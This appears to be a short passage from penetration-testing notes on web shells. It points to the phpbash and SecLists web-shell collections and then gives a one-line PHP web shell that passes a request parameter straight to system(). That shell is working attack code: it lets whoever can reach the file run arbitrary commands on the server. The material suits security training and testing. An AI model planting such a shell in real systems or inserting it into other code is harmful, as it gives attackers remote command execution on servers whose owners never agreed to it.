
---
[phpbash](https://github.com/Arrexel/phpbash) provides a terminal-like, semi-interactive web shell. [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages, which can be found in `/seclists/Web-Shells`

### Writing Simple Web Shell
```php
<?php system($_REQUEST['cmd']); ?>
```

